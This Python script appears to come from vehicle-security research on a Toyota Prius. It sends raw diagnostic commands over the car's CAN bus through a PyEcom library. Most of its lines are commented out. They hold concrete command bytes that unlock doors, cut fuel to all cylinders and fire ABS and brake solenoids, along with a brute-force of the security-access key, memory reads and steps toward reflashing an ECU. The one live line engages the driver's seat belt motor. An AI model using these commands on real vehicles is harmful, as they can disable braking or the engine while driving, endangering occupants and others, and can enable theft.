from PyEcom import *
from config import *
import time, struct

if __name__ == "__main__":
    #print "[*] Starting diagnostics check..."
    ecom = PyEcom('Debug\\ecomcat_api')
    ecom.open_device(1,37440)

    #Unlock Trunk/Backdoor
    #ecom.send_iso_tp_data(0x750, [0x30, 0x11, 0x00, 0x00, 0x80], 0x40)

    #Lock All Doors
    #ecom.send_iso_tp_data(0x750, [0x30, 0x11, 0x00, 0x80, 0x00], 0x40)

    #Unlock All Doors
    #ecom.send_iso_tp_data(0x750, [0x30, 0x11, 0x00, 0x40, 0x00], 0x40)

    #Turn Horn ON
    #ecom.send_iso_tp_data(0x750, [0x30, 0x06, 0x00, 0x20], 0x40)

    #Turn Horn OFF
    #ecom.send_iso_tp_data(0x750, [0x30, 0x06, 0x00, 0x00], 0x40)

    #Turn lights ON
    #ecom.send_iso_tp_data(0x750, [0x30, 0x15, 0x00, 0x40, 0x00], 0x40)

    #Turn lights OFF (needs to be in Auto setting)
    #ecom.send_iso_tp_data(0x750, [0x30, 0x15, 0x00, 0x00, 0x00], 0x40)

    #Driver's seat belt motor engage
    #0x30 == inputOutputControlByLocalIdentifier
    ecom.send_iso_tp_data(0x781, [0x30, 0x01, 0x00, 0x01])

    #Passenger's side seat belt motor engage
    #ecom.send_iso_tp_data(0x781, [0x30, 0x01, 0x00, 0x02])

    #Both passenger and driver seat belt motor engage
    #ecom.send_iso_tp_data(0x781, [0x30, 0x01, 0x00, 0x03])

    #Seat Belt ECU - IsTesterPresent
    #ret = ecom.send_iso_tp_data(0x781, [0x3E])

    #Get DTC Codes
    #ret = ecom.send_iso_tp_data(0x781, [0xA8, 0x01])

    #Clear DTC Codes
    #ret = ecom.send_iso_tp_data(0x781, [0x14])

    #Driver's seat belt motor engage
    #The fancy pants way
    #pkg = PriusCMD["Seat_Belt_Drive"]
    #ecom.send_iso_tp_data(pkg['ID'], pkg['Data'])

    #Fuel cut all cylinders
    #ecom.send_iso_tp_data(0x7E0, [0x30, 0x1C, 0x00, 0x0F, 0xA5, 0x01])
    #pkg = PriusCMD["Fuel_Cut_All"]
    #ecom.send_iso_tp_data(pkg['ID'], pkg['Data'])

    #ecom.send_iso_tp_data(0x750, [0x30, 0x06, 0x00, 0x00], 0x40)

    #set diagnostic session
    #ret = ecom.diagnostic_session(0x7E2, [0x10, 0x01])
    #if(ret):
    #    print "Diagnostic Session Successful"
    #else:
    #    print "Diagnostic Session Failure"

    #BRUTE FORCE
##    ret = ecom.toyota_cracker(0x7E2)
##    if(ret):
##        print "FOUND KEY"
##    else:
##        print "[!] KEY Cracker failed"

    #READ MEMORY
##    offset = 0xFFFF
##    size = 100
##    for i in range(0, 10):
##        ret = ecom.read_memory(0x7E2, offset, size)
##        offset += size

    #0x7E2 - Hybrid system will respond gracefully to security access
    #ret = ecom.security_access(0x7E2)

    #ret = ecom.security_access(0x750, [0x27, 0x01], 0x40)

##    for ecu_num, ecu_name in PriusECU.iteritems():
##        print "Trying security access for %s" % (ecu_name)
##        #security access
##        ret = ecom.security_access(ecu_num)
##        if(not ret):
##            ecom.security_access(ecu_num, [0x27, 0x01, 0x00])

##    for ecu_sub_num, ecu_name in PriusMainECU.iteritems():
##        print "Trying security access for %s" % (ecu_name)
##        ret = ecom.security_access(0x750, [0x27, 0x01], ecu_sub_num)
##        if(not ret):
##            ecom.security_access(0x750, [0x27, 0x01, 0x00], ecu_sub_num)

    #reading memory address
    #for ecu_num, ecu_name in PriusECU.iteritems():    
    #    ret = ecom.pull_data(ecu_num, 0x00000000, 0x10, 0x23)

    #reading memory address main ecu    
    #ret = ecom.pull_data(0x750, 0x00000000, 0x10, 0x40, 0x23)

    #Try to request upload
    #for ecu_num, ecu_name in PriusECU.iteritems():
    #    ret = ecom.pull_data(ecu_num, 0x00000000, 0x10, 0x35)

    #ecom.send_iso_tp_data(0x7E0, [0x11, 0x01, 0x06])

    #ABS Solenoids
    #SFRH
    #ecom.send_iso_tp_data(0x7B0, [0x30,0x21,0x02,0xFF,0x01])
    #SRRH
    #ecom.send_iso_tp_data(0x7B0, [0x30,0x21,0x02,0xFF,0x10])
    #SFRR
    #ecom.send_iso_tp_data(0x7B0, [0x30,0x21,0x02,0xFF,0x02])
    #SRRR
    #ecom.send_iso_tp_data(0x7B0, [0x30,0x21,0x02,0xFF,0x20])
    #SFLH
    #ecom.send_iso_tp_data(0x7B0, [0x30,0x21,0x02,0xFF,0x04])
    #SRLH
    #ecom.send_iso_tp_data(0x7B0, [0x30,0x21,0x02,0xFF,0x40])
    #SFLR
    #ecom.send_iso_tp_data(0x7B0, [0x30,0x21,0x02,0xFF,0x08])
    #SRLR
    #ecom.send_iso_tp_data(0x7B0, [0x30,0x21,0x02,0xFF,0x80])
    
    #ECB Solenoids
    #SRC
    #ecom.send_iso_tp_data(0x7B0, [0x30, 0x2D, 0x00, 0x00, 0x00, 0x08, 0x08])
    #SMC
    #ecom.send_iso_tp_data(0x7B0, [0x30, 0x2D, 0x1E, 0x00, 0x00, 0x04, 0x04])
    #SCC
    #ecom.send_iso_tp_data(0x7B0, [0x30, 0x2D, 0x1E, 0x00, 0x00, 0x02, 0x02])
    #SSC
    #ecom.send_iso_tp_data(0x7B0, [0x30, 0x2D, 0x00, 0x00, 0x00, 0x01, 0x01])
    #SMC/SRC/SCC
    #ecom.send_iso_tp_data(0x7B0, [0x30, 0x2D, 0x1E, 0x00, 0x00, 0x0E, 0x0E])

    #ECB SLR Valve Close
    #05 30 2B 00 80 FA (3 amps)
    #05 30 2B 00 80 00 (0 amps)
    #ecom.send_iso_tp_data(0x7B0, [0x30, 0x2B, 0x00, 0x80, 0xFA])

    #ECB SLA Valve Close
    #05 30 2B 00 40 FA (3 amps)
    #05 30 2B 00 40 00 (0 amps)
    #ecom.send_iso_tp_data(0x7B0, [0x30, 0x2B, 0x00, 0x40, 0xFA])
    
    
    #RESET
    #ecom.send_iso_tp_data(0x7B0, [0x01, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])

##    for ecu_num, ecu_name in PriusECU.iteritems():
##        ret = ecom.security_access(ecu_num, [0x27, 0x01])
##        if(ret == True):
##            print "[*] %s has security access" % (ecu_name)
##        else:
##            print "[!] %s NO security access" % (ecu_name)

    #ret = ecom.security_access(0x7E0)
##    for i in range(0, 0xFFFF):
##        ret = ecom.routine_control(0x7E0, 0x01, i, None)
##        if(ret == True):
##            print "Found Valid Routine: %04X" % (i)
##            break

    #Send messages to 0004, 0002
    #ret = ecom.security_access(0x7E0)
    #ecom.send_iso_tp_data(0x03, [0x00])
    #ecom.send_iso_tp_data(0x03, [0x00])
    #ecom.send_iso_tp_data(0x03, [0x20, 0x07, 0x03, 0x00, 0x04])
    #ecom.send_iso_tp_data(0x03, [0x05, 0x00])
    #ecom.send_iso_tp_data(0x03, [0x18, 0x6E, 0x71, 0xB4])

    #Diagnostic Session Testing
##    for ecu_num, ecu_name in PriusECU.iteritems():
##        ret = ecom.diagnostic_session(ecu_num, [0x10, 0x02])
##        if ret:
##            print "[*] %s supports SecurityAccess" % (ecu_name)
##        else:
##            print "[!] %s does NOT support SecurityAccess" % (ecu_name)

    ########################################################
    #Start of EXACT Flash Update
    ########################################################
##    val = ecom.toyota_targetdata_to_dword("423445453A3E4839")
##
##    print "%04X" % (val)
##
##    net_1 = val & 0xFF
##    net_2 = (val >> 8) & 0xFF
##    net_3 = (val >> 16) & 0xFF
##    net_4 = (val >> 24) & 0xFF
##
##    print "%02X %02X %02X %02X" % (net_1, net_2, net_3, net_4)
##    
##    ON = True
##    ECU = 0x7E0

##    #Is CPU?
##    ret = ecom.send_iso_tp_data(ECU, [0x09, 0x00])
##
##    #Get Calibration IDs
##    ret = ecom.send_iso_tp_data(ECU, [0x09, 0x04])
##
##    #NOT sure if this is necessary
##    ret = ecom.send_iso_tp_data(0x7DF, [0x09, 0x00])
##
##    #????
##    ret = ecom.send_iso_tp_data(ECU, [0x13, 0x80])
##
##    #Get VIN
##    ret = ecom.send_iso_tp_data(ECU, [0x09, 0x04])    
##
##    if ON: 
##        ret = ecom.security_access(ECU)
##        if ret:
##            print "[*] [0x%04X] Security Access: Success" % (ECU)
##
##            #Unsure but this happens 3x in the capture before diag programming mode
##            #I think this may have to do w/ tellin other ECUs the one being reprogrammed
##            #is going offline for a while and DO NOT set DTC codes
##            for i in range(0, 3):
##                ret = ecom.send_iso_tp_data(0x720, [0xA0, 0x27])
##                                            
##            ret = ecom.diagnostic_session(ECU, [0x10, 0x02])
##            if ret:
##                print "[*] [0x%04X] Programming Mode: Success" % (ECU)
##
##                ecom.send_iso_tp_data(0x01, [0x00])
##                ecom.send_iso_tp_data(0x01, [0x00])
##                ecom.send_iso_tp_data(0x01, [0x20, 0x07, 0x01, 0x00, 0x02, 0x00])
##                ecom.send_iso_tp_data(0x01, [0x01, 0x00])
##  
##                ecom.send_iso_tp_data(0x01, [0xEF, 0x6F, 0x1F, 0xBC])           

    #GetRomVersion
    #ret = ecom.send_iso_tp_data(ECU, [0xA4, 0x00, 0x08])

    #GetSoftwareInfoID
    #ret = ecom.send_iso_tp_data(ECU, [0x1A, 0x88, 0x00])

    #StartRoutineByLocalIdentifier
    #ret = ecom.send_iso_tp_data(ECU, [0x31, 0x01, 0xF0, 0x11, 0x00, 0x01, 0x44, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01])

    #This should reset the ECU to standard diagnostic mode
    #ret = ecom.diagnostic_session(ECU, [0x10, 0x81])

    #Try Reset the ECU
    #ecom.send_iso_tp_data(ECU, [0x11])

    #this should get an error 0x11
    #ecom.request_upload_14229(ECU, 0x01, 0x44, 0x00001000, 0x00000001)
    #ecom.request_upload_14230(ECU, 0x01, 0x00001000, 0x00000001)

    #ecom.read_memory_14229(ECU, 0x44, 0x00001000, 0x00000001)
    #ecom.read_memory_14229(ECU, 0x24, 0x00001000, 0x00000001)
    #ecom.read_memory_14230(ECU, 0x00001000, 0x00000001)

    #Test security access for 0x720    
    #ret = ecom.security_access(0x720)
    #ret = ecom.security_access(0x7DF)
    #ret = ecom.security_access(0x0001)
    #ret = ecom.security_access(0x0002)
    #ret = ecom.security_access(0x0003)
    #ret = ecom.security_access(0x0004)
